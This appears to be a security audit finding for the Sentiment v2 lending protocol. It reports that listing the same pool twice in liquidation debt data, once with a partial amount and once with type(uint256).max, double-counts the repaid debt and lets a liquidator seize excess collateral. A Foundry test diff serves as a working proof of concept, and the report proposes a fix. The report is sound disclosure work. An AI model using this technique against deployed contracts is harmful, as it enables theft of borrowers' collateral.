Flat Tawny Haddock

High

# User's can seize more assets during liquidation by using type(uint).max

## Summary
User's can seize more assets during liquidation than what should be actually allowed by replaying the repayment amount using type(uint).max 

## Vulnerability Detail
The liquidators are restricted on the amount of collateral they can seize during a liquidation

Eg:
if a position has 1e18 worth debt, and 2e18 worth collateral, then on a liquidation the user cannot seize 2e18 collateral by repaying the 1e18 debt, and they are limited to seizing for ex. 1.3e18 worth of collateral (depends on the liquidation discount how much profit a liquidator is able to generate)

The check for this max seizable amount is kept inside `_validateSeizedAssetValue`

[link](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/RiskModule.sol#L129-L145)
```solidity
    function _validateSeizedAssetValue(
        address position,
        DebtData[] calldata debtData,
        AssetData[] calldata assetData,
        uint256 discount
    ) internal view {
        // compute value of debt repaid by the liquidator
        uint256 debtRepaidValue;
        uint256 debtLength = debtData.length;
        for (uint256 i; i < debtLength; ++i) {
            uint256 poolId = debtData[i].poolId;
            uint256 amt = debtData[i].amt;
            if (amt == type(uint256).max) amt = pool.getBorrowsOf(poolId, position);
            address poolAsset = pool.getPoolAssetFor(poolId);
            IOracle oracle = IOracle(riskEngine.getOracleFor(poolAsset));
            debtRepaidValue += oracle.getValueInEth(poolAsset, amt);
        }

        .....

        uint256 maxSeizedAssetValue = debtRepaidValue.mulDiv(1e18, (1e18 - discount));
        if (assetSeizedValue > maxSeizedAssetValue) {
            revert RiskModule_SeizedTooMuch(assetSeizedValue, maxSeizedAssetValue);
        }
```

But the `_validateSeizedAssetValue` is flawed as it assumes that the value `type(uint256).max` will result in the liquidator repaying the current `pool.getBorrowsOf(poolId, position)` value. In the actual execution, an attacker can repay some amount earlier and then use `type(uint256).max` on the same pool which will result in a decreased amount because debt has been repaid earlier

Eg:
getBorrows of position = 1e18
user passes in 0.9e18 and type(uint).max as the repaying values
the above snippet will consider it as 0.9e18 + 1e18 being repaid and hence allow for more than 1.9e18 worth of collateral to be seized
but during the actual execution, since 0.9e18 has already been repaid, only 0.1e18 will be transferred from the user allowing the user

### POC Code
Apply the following diff and run `testHash_LiquidateExcessUsingDouble`. It is asserted that a user can use this method to seize the entire collateral of the debt position even though it results in a much higher value than what should be actually allowed

```diff
diff --git a/protocol-v2/test/integration/LiquidationTest.t.sol b/protocol-v2/test/integration/LiquidationTest.t.sol
index beaca63..29e674a 100644
--- a/protocol-v2/test/integration/LiquidationTest.t.sol
+++ b/protocol-v2/test/integration/LiquidationTest.t.sol
@@ -48,6 +48,85 @@ contract LiquidationTest is BaseTest {
         vm.stopPrank();
     }
 
+    function testHash_LiquidateExcessUsingDouble() public {
+        vm.startPrank(user);
+        asset2.approve(address(positionManager), 1e18);
+
+        // deposit 1e18 asset2, borrow 1e18 asset1
+        Action[] memory actions = new Action[](7);
+        (position, actions[0]) = newPosition(user, bytes32(uint256(0x123456789)));
+        actions[1] = deposit(address(asset2), 1e18);
+        actions[2] = addToken(address(asset2));
+        actions[3] = borrow(fixedRatePool, 1e18);
+        actions[4] = approve(address(mockswap), address(asset1), 1e18);
+        bytes memory data = abi.encodeWithSelector(SWAP_FUNC_SELECTOR, address(asset1), address(asset2), 1e18);
+        actions[5] = exec(address(mockswap), 0, data);
+        actions[6] = addToken(address(asset3));
+        positionManager.processBatch(position, actions);
+        vm.stopPrank();
+        assertTrue(riskEngine.isPositionHealthy(position));
+
+        (uint256 totalAssetValue, uint256 totalDebtValue, uint256 minReqAssetValue) = riskEngine.getRiskData(position);
+
+        assertEq(totalAssetValue, 2e18);
+        assertEq(totalDebtValue, 1e18);
+        assertEq(minReqAssetValue, 2e18);
+
+        // modify asset2 price from 1eth to 0.9eth
+        // now there is 1e18 debt and 1.8e18 worth of asset2
+        FixedPriceOracle pointOneEthOracle = new FixedPriceOracle(0.9e18);
+        vm.prank(protocolOwner);
+        riskEngine.setOracle(address(asset2), address(pointOneEthOracle));
+        assertFalse(riskEngine.isPositionHealthy(position));
+        
+        // maximumSeizable amount with liquidation discount : 1388888888888888888 ie. 1.38e18
+        uint liquidationDiscount = riskEngine.riskModule().LIQUIDATION_DISCOUNT();
+        uint supposedMaximumSeizableAssetValue = totalDebtValue * 1e18 / (1e18 - liquidationDiscount);
+        uint maximumSeizableAssets = supposedMaximumSeizableAssetValue * 1e18 / 0.9e18;
+
+        assert(maximumSeizableAssets == 1388888888888888888);
+
+        DebtData memory debtData = DebtData({ poolId: fixedRatePool, amt: 1e18 });
+        DebtData[] memory debts = new DebtData[](1);
+        debts[0] = debtData;
+
+        // verifying that attempting to seize more results in a revert
+        // add dust to cause minimal excess
+        AssetData memory asset2Data = AssetData({ asset: address(asset2), amt: maximumSeizableAssets + 10 });
+        AssetData[] memory assets = new AssetData[](1);
+        assets[0] = asset2Data;
+
+        asset1.mint(liquidator, 10e18);
+
+        vm.startPrank(liquidator);
+        asset1.approve(address(positionManager), 1e18);
+
+        // seizeAttempt value : 1250000000000000008, seizable value : 1250000000000000000
+        vm.expectRevert(abi.encodeWithSelector(RiskModule.RiskModule_SeizedTooMuch.selector, 1250000000000000008, 1250000000000000000));
+        positionManager.liquidate(position, debts, assets);
+        vm.stopPrank();
+
+        // but an attacker can liquidate almost double by exploiting the type.max issue
+        debtData = DebtData({ poolId: fixedRatePool, amt: 0.9e18 });
+        debts = new DebtData[](2);
+        debts[0] = debtData;
+
+        // replay the balance value. this will cause the repaid amount to be double counted allowing the user to liquidate the entire assets
+        debtData = DebtData({ poolId: fixedRatePool, amt: type(uint256).max });
+        debts[1] = debtData;
+
+        // liquidate full asset balance
+        asset2Data = AssetData({ asset: address(asset2), amt: 2e18 });
+        assets = new AssetData[](1);
+        assets[0] = asset2Data;
+
+        // liquidate
+        vm.startPrank(liquidator);
+        asset1.approve(address(positionManager), 1e18);
+        positionManager.liquidate(position, debts, assets);
+        vm.stopPrank();
+    }
+
     function testLiquidate() public {
         vm.startPrank(user);
         asset2.approve(address(positionManager), 1e18);
```

## Impact
Borrowers will loose excess collateral during liquidation

## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/RiskModule.sol#L129-L145

## Tool used
Manual Review

## Recommendation
Only allow a one entry for each poolId in the `debtData` array. This can be enforced by checking that the array is in a strictly sequential order on pools 